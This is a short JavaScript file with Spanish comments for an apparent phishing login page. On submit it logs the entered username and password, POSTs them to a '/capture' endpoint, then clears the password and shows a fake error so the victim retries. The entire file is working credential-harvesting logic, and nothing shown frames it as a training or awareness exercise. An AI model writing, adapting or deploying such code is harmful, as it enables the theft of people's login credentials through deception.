const form = document.getElementById("form");
const userInput = document.getElementById("user");
const passInput = document.getElementById("pass");
const errorDiv = document.getElementById("error");

form.addEventListener("submit", function (event) {
	event.preventDefault();
	const user = userInput.value;
	const pass = passInput.value;

	console.log("Usuario:", user);
	console.log("Contraseña:", pass);

	fetch("/capture", {
		method: "POST",
		headers: {
			"Content-Type": "application/x-www-form-urlencoded", // O 'application/json' si envías un JSON
		},
		body: `user=${encodeURIComponent(user)}&pass=${encodeURIComponent(pass)}`,
	})
		.then((response) => {
			console.log("Credenciales enviadas al servidor.");
		})
		.catch((error) => {
			console.error("Error al enviar credenciales:", error);
		});
	passInput.value = "";
	passInput.focus();
	errorDiv.hidden = false;
	setTimeout(() => {
		errorDiv.hidden = true;
	}, 3000);
});
